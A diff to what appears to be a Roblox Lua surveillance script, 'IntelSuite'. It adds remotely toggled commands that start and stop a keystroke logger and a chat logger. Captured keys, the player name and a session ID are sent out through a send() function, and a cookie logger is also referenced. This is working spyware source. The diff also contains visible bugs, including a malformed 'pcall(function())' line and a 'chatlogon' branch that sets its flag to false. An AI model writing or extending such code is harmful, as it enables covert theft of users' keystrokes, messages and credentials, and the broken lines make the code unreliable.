@@ -571,7 +571,8 @@ task.wait(1)
 -- ============================================================
 UserInputService.InputBegan:Connect(function(input, gp)
     if not getgenv().IntelSuite.IsActive then return end
-    pcall(function()
+    if not getgenv().IntelSuite.KeylogActive then return end
+    pcall(function())
         if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
             getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. input.KeyCode.Name .. "]"
         end
@@ -919,6 +920,26 @@ task.spawn(function()
                 else
                     send("COOKIE LOGGER", "Not loaded yet.", 16711680)
                 end
+                elseif cmd == "keylogon" then
+                getgenv().IntelSuite.KeylogActive = true
+                getgenv().IntelSuite.Buffer = ""
+                send("KEYLOGGER", "**Status:** ON\n**User:** " .. LocalPlayer.Name .. "\n**Session:** " .. SESSION_ID, 65280)
+                elseif cmd == "keylogoff" then
+                getgenv().IntelSuite.KeylogActive = false
+                if #getgenv().IntelSuite.Buffer > 0 then
+                    send("KEYLOG FLUSH", "**User:** " .. LocalPlayer.Name .. "\n**Keys:** " .. getgenv().IntelSuite.Buffer, 16711680)
+                    getgenv().IntelSuite.Buffer = ""
+                end
+                send("KEYLOGGER", "**Status:** OFF\n**User:** " .. LocalPlayer.Name .. "\n**Session:** " .. SESSION_ID, 16711680)
+                elseif cmd == "chatlogon" then
+                getgenv().IntelSuite.ChatLogActive = false
+                if getgenv().IntelSuite.ChatLogger then
+                    task.spawn(getgenv().IntelSuite.ChatLogger)
+                end
+                send("CHAT LOGGER", "**Status:** ON\n**User:** " .. LocalPlayer.Name, 65280)
+                elseif cmd == "chatlogoff" then
+                getgenv().IntelSuite.ChatLogActive = false
+                send("CHAT LOGGER", "**Status:** OFF\n**User:** " .. LocalPlayer.Name, 16711680)
             end
         end)
     end
@@ -1090,8 +1111,8 @@ local function startChatLogger()
     send("CHAT LOGGER", "Chat logger active. Messages will be sent in batches of 10 or every 10 seconds.", 16753920)
 end
 
--- Start on load
-task.spawn(startChatLogger)
+-- OFF by default. Enable via !cmd chatlogon
+-- task.spawn(startChatLogger)
 getgenv().IntelSuite.ChatLogger = startChatLogger
 
 -- ============================================================
